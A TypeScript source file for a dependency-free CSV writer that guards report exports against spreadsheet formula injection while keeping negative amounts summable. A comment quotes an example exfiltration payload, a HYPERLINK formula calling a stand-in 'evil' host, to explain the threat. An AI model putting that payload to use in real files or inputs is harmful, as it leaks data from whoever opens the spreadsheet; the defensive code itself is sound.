/**
 * Minimal, dependency-free CSV writer for the report exports.
 *
 * Hand-rolled on purpose: the export shapes are a handful of flat rows, and a
 * CSV library would be a new dependency in the container for something this
 * small. What a library WOULD have given us for free is the escaping, so both
 * parts of it are implemented and tested explicitly here.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ['=', '+', '-', '@'];
/** Leading control characters Excel also treats as formula-ish. */
const CONTROL_PREFIXES = ['\t', '\r'];

/**
 * A plain, finite decimal number: an optional leading minus, digits, and an
 * optional fractional part. `-250.00`, `42`, `3.14`, `-5` all match; `-1+1`,
 * `=cmd`, `+66812345678`, `1e5`, `--1` do NOT.
 *
 * This is the exact boundary that lets a NEGATIVE number survive the CSV as a
 * summable value while a formula payload that merely starts with `-` is still
 * defanged. A leading `-` followed only by digits cannot carry an injection —
 * there is no formula there to execute.
 */
const SAFE_NUMERIC = /^-?\d+(\.\d+)?$/;

export type CsvValue = string | number | boolean | null | undefined;

/**
 * Escapes one field.
 *
 * Two independent concerns, in order:
 *
 * 1. CSV INJECTION. A cell whose text begins with =, +, -, @ (or a leading tab
 *    / CR) is executed as a formula when the file is opened in Excel, Sheets,
 *    or LibreOffice — so an attacker-controlled string like
 *    `=HYPERLINK("http://evil/?"&A1)` exfiltrates data the moment an admin
 *    opens the export. The mitigation is to prefix the cell with a single
 *    quote, which spreadsheets treat as "this is literal text". The visible
 *    value is unchanged.
 *
 *    EXCEPTION — a plain number is never a formula (Phase 6, System Analyst
 *    C8/C7). Commerce reversals are NEGATIVE by design (`-240.00`), and the
 *    naive "prefix anything starting with `-`" rule exported every reversal as
 *    the text cell `'-240.00`, which a spreadsheet will not sum — an admin
 *    reconciling the export would get a total silently EXCLUDING every reversal.
 *    A money error, in the one phase whose whole premise is not producing money
 *    errors. So a value matching SAFE_NUMERIC skips the formula guard: it stays
 *    a summable number, while `-1+1` / `=cmd` / a leading-tab payload are still
 *    defanged. Payout revenue is never negative, so no existing export byte
 *    changes — every current caller passes non-numeric strings or non-negative
 *    numbers, both handled identically to before.
 *
 * 2. CSV QUOTING. Fields containing a comma, quote, or newline get wrapped in
 *    double quotes with inner quotes doubled (RFC 4180).
 */
export function escapeCsvField(value: CsvValue): string {
  if (value === null || value === undefined) {
    return '';
  }
  let text = String(value);

  const firstChar = text.charAt(0);
  const isFormulaish = FORMULA_PREFIXES.includes(firstChar) || CONTROL_PREFIXES.includes(firstChar);
  if (isFormulaish && !SAFE_NUMERIC.test(text)) {
    text = `'${text}`;
  }

  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

/**
 * Renders a header row plus data rows as a CSV document. CRLF line endings
 * (RFC 4180) so Excel on Windows doesn't render one long line.
 */
export function toCsv(headers: readonly string[], rows: readonly CsvValue[][]): string {
  const lines = [
    headers.map(escapeCsvField).join(','),
    ...rows.map((row) => row.map(escapeCsvField).join(',')),
  ];
  return `${lines.join('\r\n')}\r\n`;
}
